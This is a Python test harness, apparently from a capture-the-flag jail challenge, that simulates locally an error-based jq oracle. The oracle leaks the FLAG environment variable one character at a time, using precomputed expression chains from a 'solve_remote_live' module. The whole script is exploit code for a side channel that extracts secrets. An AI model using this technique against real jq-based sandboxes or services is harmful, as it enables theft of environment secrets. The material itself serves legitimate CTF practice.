import subprocess
import sys
import solve_remote_live, json

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def simulate_local_query(expr, flag="jail{test_flag_123}"):
    cmd = ["jq", "-n", expr]
    res = subprocess.run(cmd, capture_output=True, env={"FLAG": flag})
    if res.returncode != 0:
        return "error"
    return "ok"

def main():
    test_flag = "jail{test_flag_123}"
    print(f"[*] Testing Local Oracle Simulation on FLAG: '{test_flag}'")

    for pos, expected_char in enumerate(test_flag):
        expected_val = pos + ord(expected_char)
        if expected_val not in CHAINS:
            print(f"[!] Pos {pos:2d} ('{expected_char}'): val {expected_val} not in chains (skipped)")
            continue
        
        pred = predicate(CHAINS[expected_val])
        # Expression: [env|flatten|sort|last|explode|tostream].[pos] | flatten | add | pred | error
        expr = f"[env|flatten|sort|last|explode|tostream]|.[{pos}]|flatten|add|{pred}|error"
        
        ans = simulate_local_query(expr, test_flag)
        if ans == "error":
            print(f"[+] Pos {pos:2d} ('{expected_char}'): MATCH SUCCESS! (val {expected_val})")
        else:
            print(f"[-] Pos {pos:2d} ('{expected_char}'): FAILED (ans={ans})")

if __name__ == "__main__":
    main()
